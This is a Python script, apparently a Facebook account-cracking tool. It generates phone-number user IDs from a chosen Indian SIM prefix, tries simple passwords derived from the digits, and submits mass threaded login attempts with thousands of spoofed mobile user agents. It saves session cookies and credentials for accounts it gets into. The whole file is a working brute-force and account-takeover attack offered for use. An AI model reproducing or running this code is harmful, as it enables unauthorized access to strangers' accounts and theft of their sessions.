import os,time
os.system('clear')
from os import path
import os,base64,zlib,pip,urllib
try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        print('INSTALLING MISSING LIBRARY')
        os.system('pip install requests futures==2 > /dev/null')
except:pass
print("FOLLOW MY GITHUB ACC")
time.sleep(0.009)
os.system("xdg-open https://github.com/H4X-GG")
#-------------------[-----]------------------#
user=[]
ok=[]
cp=[]
loop=0
redmi=[]
ugen=[]
models=[]
#-----------------[------]--------------------#
and_models=requests.get("https://raw.githubusercontent.com/H4X-GG/SERVER/main/MODELS/models.txt").text.splitlines()
for xx in and_models:
	models.append(xx)
for x in range(5000):
	a="Mozilla/5.0 (Linux; Android"
	b=random.randrange(5,13)
	mod=random.choice(models)
	c=") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"
	d=random.randrange(30,999)
	e=random.randrange(3959,5690)
	f=random.randrange(50,299)
	g="Mobile Safari/537.36"
	uak=f"{a} {b}; {mod}{c}{d}.0.{e}.{f} {g}"
	ugen.append(uak)
for x in range(5000):
	_ua1_=f"Mozilla/5.0 (Linux; {str(random.randint(4,13))}.{str(random.randint(1,5))}.{str(random.randint(1,5))}; SM-J500H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(random.randint(33,199))}.0.{str(random.randint(4000,5900))}.{str(random.randint(40,180))} Mobile Safari/537.36"
	_ua2_=f"NokiaC1-02/2.0 (0{str(random.randint(1,9))}.{str(random.randint(10,90))}) Profile/MIDP-2.1 Configuration/CLDC-1.1 UCWEB/2.0 (Java; U; MIDP-2.0; en-US; NokiaC1-02) U2/1.0.0 UCBrowser/{str(random.randint(1,9))}.{str(random.randint(1,9))}.{str(random.randint(1,9))}.{str(random.randint(22,300))} U2/1.0.0 Mobile UNTRUSTED/1.0"
	_ua3_=f"Mozilla/5.0 (Linux; U; Android {str(random.randint(1,9))}.{str(random.randint(1,5))}.{str(random.randint(1,5))}; ru-ru; HTC_ChaCha_A810e Build/GRJ90) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
	_ua4_=f"Mozilla/5.0 (Linux; Android {str(random.randint(2,9))}.{str(random.randint(1,5))}.{str(random.randint(1,4))}; Micromax A190 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(random.randint(20,120))}.0.0.{str(random.randint(40,140))} Mobile Safari/537.36"
	_ua5_=f"Mozilla/5.0 (Linux; Android {str(random.randint(2,9))}.{str(random.randint(1,5))}.{str(random.randint(1,4))}; GS-500 Build/JOP40D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(random.randint(30,80))}.0.{str(random.randint(1879,2580))}.{str(random.randint(30,90))} Mobile Safari/537.36 OPR/{str(random.randint(10,80))}.0.{str(random.randint(1001,9999))}.{str(random.randint(11111,99999))}"
	_ua6_=f"Mozilla/5.0 (Linux; U; Android {str(random.randint(2,12))}.1.1; en-us; CPH1727 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(random.randint(40,130))}.0.{str(random.randint(3233,4878))}.{str(random.randint(66,99))} Mobile Safari/537.36 HeyTapBrowser/{str(random.randint(10,90))}.{str(random.randint(2,9))}.{str(random.randint(2,9))}.{str(random.randint(2,9))}"
	_ua7_=f"Mozilla/5.0 (Linux; U; Android {str(random.randint(2,12))}.{str(random.randint(1,5))}.{str(random.randint(0,5))}; en-gb; SD4930UR Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Silk/{str(random.randint(1,9))}.{str(random.randint(20,99))} like Chrome/{str(random.randint(11,99))}.0.{str(random.randint(1200,1999))}.{str(random.randint(99,130))} Mobile Safari/537.36"
	_ua8_=f"Mozilla/5.0 (Linux; U; Android {str(random.randint(4,12))}.1.2; uk-ua; GT-N7000 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
	_ua9_=f"Mozilla/5.0 (Linux; Android {str(random.randint(4,10))}.2.1; en-us; Nexus 4 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/{str(random.randint(10,90))}.0.{str(random.randint(500,1100))}.{str(random.randint(90,170))} Mobile Safari/535.19"
	ua = random.choice([_ua1_,_ua2_,_ua3_,_ua4_,_ua5_,_ua6_,_ua7_,_ua8_,_ua9_])
	ugen.append(ua)





#-----------------------------------------------------------------------------------------------------------



logo=('''\033[1;32m
████████ ███████ ███████ ████████ 
   ██    ██      ██         ██    
   ██    █████   ███████    ██    
   ██    ██           ██    ██    
   ██    ███████ ███████    ██   \033[1;37m ''')

def clear():
    os.system('clear')
    print(logo)

def line():
    print(50*'\033[1;32m-\033[1;37')

def _MH_():
    clear()
    line()
    print('\033[1;30m[\033[1;33m1\033[1;30m] \033[1;32mRANDOM UID CRACK')
    print('\033[1;30m[\033[1;33m2\033[1;30m] \033[1;32mCONTACT ADMIN')
    print('\033[1;30m[\033[1;33m3\033[1;30m] \033[1;31mEXIT')
    line()
    _IN__=input('\033[1;33m[√] INPUT : ')
    if _IN__ in '1':
        _CLONE_IND()
    if _IN__ in '2':
        os.system('xdg-open t.me/@mh1x199')
    if _IN__ in '3':
        exit ()


def _CLONE_IND():
    clear()
    line()
    print('\033[1;35mEXP :  +91730 - +91720 - +91789 ')
    line()
    code=input('\033[1;33m[√] SIM CODE : ')
    line()
    clear()
    line()
    print('\033[1;35mCRACK LIMIT : 3000 - 5000 - 10000 - 15000')
    line()
    limit=int(input('\033[1;33m[√] LIMIT : '))
    for x in range(limit):
        nmp=''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with tred(max_workers=30) as mehedi:
        clear()
        tl=str(len(user))
        line()
        print(f'\033[1;32m[√] TOTAL ID : {tl}\n\033[1;32m[√] CODE YOU PUT : {code}\n\033[1;32m[√] USE AIRPLANE MODE AFTER 5 MINUTES\n\033[1;32m[√] COOKIE SAVED IN STORAGE')
        line()
        for love in user:
            uid=code+love
            pwx = [love,love[2:],love[1:],code+love,code+love[:3]]
            mehedi.submit(crack,uid,pwx,tl)
    line()
    print(f' TOTAL OK/CP : \n{str(len(ok))}\n{str(len(cp))}')
    line()






def crack(uid,pwx,tl):
    global ok
    global loop
    try:
        for ps in pwx:
            session=requests.Session()
            sys.stdout.write(f'\r\033[1;30m[\033[1;32mTEST\033[1;30m] \033[1;36m- \033[1;30m[\033[1;32m{loop}\033[1;30m] \033[1;36m- \033[1;30m[\033[1;32mOK-{len(ok)}\033[1;30m]\r')
            sys.stdout.flush()
            ua=random.choice(ugen)
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            ___MH___={
            'authority': 'm.facebook.com',
            'method': 'GET',
            'scheme': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="115", "Google Chrome";v="115"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent':ua}
            lo = session.post('https://www.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=___MH___).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                idf = re.findall('c_user=(.*);xs', coki)[0]
                print(f'\033[1;32m[TEST-OK] {idf} | {ps} |•| {coki}\033[1;37m')
                open('/sdcard/TEST-OK.txt','a').write(idf+'|'+ps+'\n'+coki+'\n')
                ok.append(idf)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                coki1 = coki.split("1000")[1]
                idf = "1000"+coki1[0:11]
                print(f'\033[1;30m[TEST-CP] {idf} | {ps}')
                open('/sdcard/TEST-CP.txt','a').write(idf+'|'+ps+'\n')
                cp.append(idf)
                break
            else:
                continue
        loop+=1
    except:
        pass




_MH_()